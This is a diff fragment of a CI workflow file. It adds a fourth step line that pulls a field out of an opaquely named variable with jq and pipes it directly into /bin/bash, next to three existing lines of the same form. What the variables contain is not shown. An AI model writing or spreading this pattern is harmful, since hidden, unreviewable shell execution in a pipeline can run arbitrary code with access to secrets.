@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$fxf181" | jq -r .b903 | /bin/bash
           echo $q3 | jq -r .tu32 | /bin/bash
           echo $hjt26230 | jq -r .xt101 | /bin/bash
+          printf '%s' "$ye90" | jq -r .mbvl176 | /bin/bash
 
       - name: Save archive
         if: always()
